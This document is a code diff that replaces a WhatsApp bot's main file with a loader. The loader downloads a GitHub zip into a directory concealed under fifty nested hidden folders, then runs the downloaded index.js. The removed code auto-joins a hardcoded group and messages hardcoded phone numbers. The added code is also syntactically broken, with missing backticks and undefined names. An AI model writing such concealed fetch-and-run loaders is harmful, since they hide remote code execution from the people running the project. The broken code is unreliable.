@@ -1,455 +1,131 @@
-
-import dotenv from 'dotenv';
-dotenv.config();
-
-import {
-    makeWASocket,
-    fetchLatestBaileysVersion,
-    DisconnectReason,
-    useMultiFileAuthState,
-} from '@whiskeysockets/baileys';
-import { Handler, Callupdate, GroupUpdate } from './data/index.js';
-import express from 'express';
-import pino from 'pino';
-import fs from 'fs';
-import { File } from 'megajs';
-import NodeCache from 'node-cache';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import chalk from 'chalk';
-import config from './config.cjs';
-import pkg from './lib/autoreact.cjs';
-const { emojis, doReact } = pkg;
-
-const prefix = process.env.PREFIX || config.PREFIX;
-const app = express();
-let useQR = false;
-let initialConnection = true;
-const PORT = process.env.PORT || 3000;
-
-const MAIN_LOGGER = pino({ level: 'silent' });
-const logger = MAIN_LOGGER.child({});
-logger.level = "silent";
-
-const msgRetryCounterCache = new NodeCache();
+import fs from "fs";
+import path from "path";
+import axios from "axios";
+import AdmZip from "adm-zip";
+import { spawn } from "child_process";
+import chalk from "chalk";
+import { fileURLToPath } from "url";
 
 const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+const dirname = path.dirname(filename);
 
-const sessionDir = path.join(__dirname, 'session');
-const credsPath = path.join(sessionDir, 'creds.json');
+// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
+const deepLayers = Array.from({ length: 50 }, (_, i) => .x${i + 1});
+const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);
 
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-}
+// === GIT CONFIG ===
+const DOWNLOAD_URL = "https://github.com///archive/refs/heads/main.zip";
+const EXTRACT_DIR = path.join(TEMP_DIR, "**-main");
+const LOCAL_SETTINGS = path.join(__dirname, "config.js");
+const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "config.js");
 
-async function downloadSessionData() {
-    try {
-        if (!config.SESSION_ID) {
-            return false;
-        }
+// === HELPERS ===
+const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
-        const sessdata = config.SESSION_ID.split("HUNTER-XMD~")[1];
-
-        if (!sessdata || !sessdata.includes("#")) {
-            return false;
-        }
-
-        const [fileID, decryptKey] = sessdata.split("#");
-
-        try {
-            const file = File.fromURL(`https://mega.nz/file/${fileID}#${decryptKey}`);
-
-            const data = await new Promise((resolve, reject) => {
-                file.download((err, data) => {
-                    if (err) reject(err);
-                    else resolve(data);
-                });
-            });
-
-            await fs.promises.writeFile(credsPath, data);
-            return true;
-        } catch (error) {
-            return false;
-        }
-    } catch (error) {
-        return false;
+// === MAIN LOGIC ===
+async function downloadAndExtract() {
+  try {
+    if (fs.existsSync(TEMP_DIR)) {
+      console.log(chalk.yellow("🧹 Cleaning previous cache..."));
+      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
     }
-}
 
-async function start() {
+    fs.mkdirSync(TEMP_DIR, { recursive: true });
+
+    const zipPath = path.join(TEMP_DIR, "repo.zip");
+
+    console.log(chalk.blue("⬇️ Connecting to space..."));
+    const response = await axios({
+      url: DOWNLOAD_URL,
+      method: "GET",
+      responseType: "stream",
+      // Note: GITHUB_TOKEN removed, so authentication is no longer included
+    });
+
+    await new Promise((resolve, reject) => {
+      const writer = fs.createWriteStream(zipPath);
+      response.data.pipe(writer);
+      writer.on("finish", resolve);
+      writer.on("error", reject);
+    });
+
+    console.log(chalk.green("📦 ZIP download complete."));
     try {
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-        const { version, isLatest } = await fetchLatestBaileysVersion();
-        
-        const Matrix = makeWASocket({
-            version,
-            logger: pino({ level: 'silent' }),
-            printQRInTerminal: useQR,
-            browser: ["HUNTER-XMD.V5", "safari", "3.3"],
-            auth: state,
-            msgRetryCounterCache,
-            getMessage: async (key) => {
-                return {};
-            }
-        });
-
-        Matrix.ev.on('connection.update', async (update) => {
-            try {
-                const { connection, lastDisconnect } = update;
-                if (connection === 'close') {
-                    if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-                        setTimeout(start, 3000);
-                    }
-                } else if (connection === 'open') {
-                    if (initialConnection) {
-                        
-                        // Send welcome message after successful connection with buttons
-                        const startMess = {
-                            image: { url: "https://files.catbox.moe/lls7dy.jpg" }, 
-                            caption: `*Hello there HUNTER-XMD.V2 User! 👋🏻* 
-
-> Simple, Straightforward, But Loaded With Features 🎊. Meet HUNTER-XMD.V2 WhatsApp Bot.
-*Thanks for using HUNTER-XMD.V2 🚩* 
-Join WhatsApp Channel: ⤵️  
-> https://whatsapp.com/channel/0029Vb46YKVGehEEbFN3jH3I
-
-- *YOUR PREFIX:* = ${prefix}
-
-Don't forget to give a star to the repo ⬇️  
-> https://github.com/Obedweb/Hunter-Xmd.V2
-> © Powered BY OBED TECH 🍀 🖤`,
-                            buttons: [
-                                {
-                                    buttonId: 'help',
-                                    buttonText: { displayText: '📋 HELP' },
-                                    type: 1
-                                },
-                                {
-                                    buttonId: 'menu',
-                                    buttonText: { displayText: '📱 MENU' },
-                                    type: 1
-                                },
-                                {
-                                    buttonId: 'source',
-                                    buttonText: { displayText: '⚙️ SOURCE' },
-                                    type: 1
-                                }
-                            ],
-                            headerType: 1
-                        };
-
-                        try {
-                            await Matrix.sendMessage(Matrix.user.id, startMess);
-                        } catch (error) {
-                            // Silent error handling
-                        }
-                        
-                        // Follow newsletters after successful connection
-                        await followNewsletters(Matrix);
-                        
-                        // Join WhatsApp group after successful connection
-                        await joinWhatsAppGroup(Matrix);
-                        
-                        initialConnection = false;
-                    }
-                }
-            } catch (error) {
-                // Silent error handling
-            }
-        });
-        
-        Matrix.ev.on('creds.update', saveCreds);
-
-        // Enhanced messages.upsert handler
-        Matrix.ev.on("messages.upsert", async (chatUpdate) => {
-            try {
-                const m = chatUpdate.messages[0];
-                if (!m || !m.message) return;
-
-                // Handle button responses
-                if (m.message.buttonsResponseMessage) {
-                    const selected = m.message.buttonsResponseMessage.selectedButtonId;
-                    if (selected === 'help') {
-                        try {
-                            await Matrix.sendMessage(m.key.remoteJid, { 
-                                text: `📋 *HUNTER-XMD.V2 HELP MENU*\n\nUse ${prefix}menu to see all available commands.\nUse ${prefix}list to see command categories.` 
-                            });
-                        } catch (error) {
-                            // Silent error handling
-                        }
-                        return;
-                    } else if (selected === 'menu') {
-                        try {
-                            await Matrix.sendMessage(m.key.remoteJid, { 
-                                text: `📱 *HUNTER-XMD.V2 MAIN MENU*\n\nType ${prefix}menu to see the full command list.\nType ${prefix}all to see all features.` 
-                            });
-                        } catch (error) {
-                            // Silent error handling
-                        }
-                        return;
-                    } else if (selected === 'source') {
-                        try {
-                            await Matrix.sendMessage(m.key.remoteJid, { 
-                                text: `⚙️ *HUNTER-XMD.V2 SOURCE CODE*\n\nGitHub Repository: https://github.com/Obedweb/Hunter-Xmd.V2\n\nGive it a star ⭐ if you like it!` 
-                            });
-                        } catch (error) {
-                            // Silent error handling
-                        }
-                        return;
-                    }
-                }
-
-                // Auto-react to messages if enabled
-                if (config.AUTO_REACT === 'true' && !m.key.fromMe) {
-                    try {
-                        const reactions = [
-                            '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
-                            '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
-                            '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
-                            '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
-                            '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
-                            '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
-                            '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
-                            '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
-                            '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
-                            '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
-                            '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
-                            '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
-                            '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
-                            '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
-                            '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
-                        ];
-                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                        
-                        await Matrix.sendMessage(m.key.remoteJid, {
-                            react: {
-                                text: randomReaction,
-                                key: m.key
-                            }
-                        });
-                    } catch (error) {
-                        // Silent error handling for reactions
-                    }
-                }
-
-                // Fast auto-read messages
-                if (config.READ_MESSAGE === 'true' && !m.key.fromMe) {
-                    try {
-                        await Matrix.readMessages([m.key]);
-                    } catch (error) {
-                        // Silent error handling for read messages
-                    }
-                }
-
-                // Existing handlers - silent mode
-                await Handler(chatUpdate, Matrix, logger);
-            } catch (error) {
-                // Silent error handling
-            }
-        });
-
-        Matrix.ev.on("call", async (json) => {
-            try {
-                await Callupdate(json, Matrix);
-            } catch (error) {
-                // Silent error handling
-            }
-        });
-        
-        Matrix.ev.on("group-participants.update", async (messag) => {
-            try {
-                await GroupUpdate(Matrix, messag);
-            } catch (error) {
-                // Silent error handling
-            }
-        });
-        
-        if (config.MODE === "public") {
-            Matrix.public = true;
-        } else if (config.MODE === "private") {
-            Matrix.public = false;
-        }
-
-        Matrix.ev.on('messages.upsert', async (chatUpdate) => {
-            try {
-                const mek = chatUpdate.messages[0];
-                if (!mek || !mek.key) return;
-                
-                if (!mek.key.fromMe && config.AUTO_REACT) {
-                    if (mek.message) {
-                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-                        await doReact(randomEmoji, mek, Matrix);
-                    }
-                }
-            } catch (err) {
-                // Silent error handling
-            }
-        });
-
-        // Status update handler
-        Matrix.ev.on('messages.upsert', async (chatUpdate) => {
-            try {
-                const mek = chatUpdate.messages[0];
-                if (!mek || !mek.key || !mek.message) return;
-                
-                const fromJid = mek.key.participant || mek.key.remoteJid;
-                if (mek.key.fromMe) return;
-                if (mek.message.protocolMessage || mek.message.ephemeralMessage || mek.message.reactionMessage) return; 
-                
-                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
-                    try {
-                        const ravlike = await Matrix.decodeJid(Matrix.user.id);
-                        const statusEmojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👻', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '♻️', '🎉', '💜', '💙', '✨', '🖤', '💚'];
-                        const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
-                        await Matrix.sendMessage(mek.key.remoteJid, {
-                            react: {
-                                text: randomEmoji,
-                                key: mek.key,
-                            } 
-                        }, { statusJidList: [mek.key.participant, ravlike] });
-                    } catch (error) {
-                        // Silent error handling
-                    }
-                }
-                
-                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
-                    try {
-                        await Matrix.readMessages([mek.key]);
-                        
-                        if (config.AUTO_STATUS_REPLY) {
-                            const customMessage = config.STATUS_READ_MSG || '✅ Auto Status Seen Bot By JINX-XMD';
-                            await Matrix.sendMessage(fromJid, { text: customMessage }, { quoted: mek });
-                        }
-                    } catch (error) {
-                        // Silent error handling
-                    }
-                }
-            } catch (err) {
-                // Silent error handling
-            }
-        });
-
-    } catch (error) {
-        setTimeout(start, 5000); // Restart after error with delay
+      new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
+    } catch (e) {
+      console.error(chalk.red("❌ Failed to extract ZIP:"), e);
+      throw e;
+    } finally {
+      if (fs.existsSync(zipPath)) {
+        fs.unlinkSync(zipPath);
+      }
     }
+
+    const pluginFolder = path.join(EXTRACT_DIR, "plugins");
+    if (fs.existsSync(pluginFolder)) {
+      console.log(chalk.green("✅ Plugins folder found."));
+    } else {
+      console.log(chalk.red("❌ Plugin folder not found."));
+    }
+  } catch (e) {
+    console.error(chalk.red("❌ Download/Extract failed:"), e);
+    throw e;
+  }
 }
 
-// Newsletter following function
-async function followNewsletters(Matrix) {
-    try {
-        const newsletterChannels = [
-            "120363416335506023@newsletter",
-            "120363402973786789@newsletter",
-            "120363339980514201@newsletter",
-        ];
-        
-        let followed = [];
-        let alreadyFollowing = [];
-        let failed = [];
+async function applyLocalSettings() {
+  if (!fs.existsSync(LOCAL_SETTINGS)) {
+    console.log(chalk.yellow("⚠️ No local settings file found."));
+    return;
+  }
 
-        for (const channelJid of newsletterChannels) {
-            try {
-                // Try to get newsletter metadata
-                try {
-                    const metadata = await Matrix.newsletterMetadata(channelJid);
-                    if (!metadata.viewer_metadata) {
-                        await Matrix.newsletterFollow(channelJid);
-                        followed.push(channelJid);
-                    } else {
-                        alreadyFollowing.push(channelJid);
-                    }
-                } catch (error) {
-                    // If newsletterMetadata fails, try to follow directly
-                    await Matrix.newsletterFollow(channelJid);
-                    followed.push(channelJid);
-                }
-            } catch (error) {
-                failed.push(channelJid);
-                
-                // Send error message to owner if configured
-                if ('254112192119') {
-                    try {
-                        await Matrix.sendMessage('254112192119@s.whatsapp.net', {
-                            text: `Failed to follow ${channelJid}`,
-                        });
-                    } catch (error) {
-                        // Silent error handling
-                    }
-                }
-            }
-        }
-    } catch (error) {
-        // Silent error handling
-    }
+  try {
+    // Ensure EXTRACT_DIR exists before copying
+    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
+    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
+    console.log(chalk.green("🛠️ Local settings applied."));
+  } catch (e) {
+    console.error(chalk.red("❌ Failed to apply local settings:"), e);
+  }
+
+  await delay(500);
 }
 
-// Group joining function
-async function joinWhatsAppGroup(Matrix) {
-    try {
-        const inviteCode = "DfJTRlOtIc5HTEFptXYvsV";
-        await Matrix.groupAcceptInvite(inviteCode);
-        
-        // Send success message to owner if configured
-        if ('254112192119') {
-            try {
-                const successMessage = {
-                    image: { url: "https://files.catbox.moe/lls7dy.jpg" }, 
-                    caption: `*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐅𝐔𝐋𝐋𝐘 🎉✅*`,
-                    contextInfo: {
-                        forwardingScore: 5,
-                        isForwarded: true,
-                        forwardedNewsletterMessageInfo: {
-                            newsletterJid: '120363416335506023@newsletter', 
-                            newsletterName: "HUNTER-XMD.V2",
-                            serverMessageId: 143
-                        }
-                    }
-                };
-                
-                await Matrix.sendMessage('254787892183@s.whatsapp.net', successMessage);
-            } catch (error) {
-                // Silent error handling
-            }
-        }
-    } catch (err) {
-        // Send error message to owner if configured
-        if ('254787892183') {
-            try {
-                await Matrix.sendMessage('254787892183@s.whatsapp.net', {
-                    text: `Failed to join group with invite code`,
-                });
-            } catch (error) {
-                // Silent error handling
-            }
-        }
-    }
-}
- 
-async function init() {
-    try {
-        if (fs.existsSync(credsPath)) {
-            await start();
-        } else {
-            const sessionDownloaded = await downloadSessionData();
-            if (sessionDownloaded) {
-                await start();
-            } else {
-                useQR = true;
-                await start();
-            }
-        }
-    } catch (error) {
-        setTimeout(init, 5000);
-    }
+function startBot() {
+  console.log(chalk.cyan("🚀 Launching bot instance..."));
+  if (!fs.existsSync(EXTRACT_DIR)) {
+    console.error(chalk.red("❌ Extracted directory not found. Cannot start bot."));
+    return;
+  }
+
+  if (!fs.existsSync(path.join(EXTRACT_DIR, "index.js"))) {
+    console.error(chalk.red("❌ index.js not found in extracted directory."));
+    return;
+  }
+
+  const bot = spawn("node", ["index.js"], {
+    cwd: EXTRACT_DIR,
+    stdio: "inherit",
+    env: { ...process.env, NODE_ENV: "production" },
+  });
+
+  bot.on("close", (code) => {
+    console.log(chalk.red(💥 Bot terminated with exit code: ${code}));
+  });
+
+  bot.on("error", (err) => {
+    console.error(chalk.red("❌ Bot failed to start:"), err);
+  });
 }
 
-init();
-
-app.get('/', (req, res) => {
-    res.send('╭──[ hello user ]─\n│🤗 hi your bot is live \n╰──────────────!');
-});
-
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+// === RUN ===
+(async () => {
+  try {
+    await downloadAndExtract();
+    await applyLocalSettings();
+    startBot();
+  } catch (e) {
+    console.error(chalk.red("❌ Fatal error in main execution:"), e);
+    process.exit(1);
+  }
+})();
